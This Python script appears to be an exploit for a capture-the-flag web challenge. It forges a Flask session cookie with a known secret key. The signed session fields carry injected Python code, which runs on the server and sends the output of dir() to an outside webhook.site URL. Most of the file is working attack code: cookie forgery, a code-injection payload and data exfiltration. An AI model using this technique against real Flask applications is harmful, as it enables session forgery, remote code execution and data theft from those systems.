import hashlib

import requests

from itsdangerous import TimestampSigner
from itsdangerous.url_safe import URLSafeTimedSerializer

# url = 'http://165.232.32.84:30288'
local_url = 'http://web:5000'
SECRET_KEY = 'tlci0GhK8n5A18K1GTx6KPwfYjuuftWw'

'''
Hack Ideas:

1. We need to learn how flask server 'signed' the session key.
(https://blog.paradoxis.nl/defeating-flasks-session-management-65706ba9d3ce)
-> basically the session key is 'SESSION-DATA.TIMESTAMP.CRYPTO-HASH'

2. To inject session keys ('ingredient' and 'measurements'),
we need to encode malicious
payload using base64 encoding and sha-1 hash the (SESSION-DATA + TIMESTAMP)
into CRYPTO-HASH
'''


def craft_session_key(secret_key, payload):
    return URLSafeTimedSerializer(
        secret_key=secret_key,
        salt='cookie-session',
        signer=TimestampSigner,
        signer_kwargs={
            'key_derivation': 'hmac',
            'digest_method': hashlib.sha1
        }
    ).dumps(payload)


def main():
    s = requests.session()
    # think about (ingredient = measurements)
    # hack idea
    # 1. try: a = dir()\nexcept: pass\nelse: print a
    # 2. try: a = dir()\nexcept: pass
    #    \nelse:\n
    #    \timport requests\n
    #     \trequests.get(
    #       "https://webhook.site/d730b6b6-7afb-4e76-aebd-dbe46fec0d4b?hack=%s" % a)
    session_key = craft_session_key(SECRET_KEY, {
        'ingredient': 'try: a',
        'measurements': '1\nexcept: pass\nelse:\n\timport requests\n\trequests.get("https://webhook.site/d730b6b6-7afb-4e76-aebd-dbe46fec0d4b?q=%s" % a)',
    })
    resp = s.get(local_url, cookies={
        'session': session_key
    })
    print(resp.text)


if __name__ == '__main__':
    main()
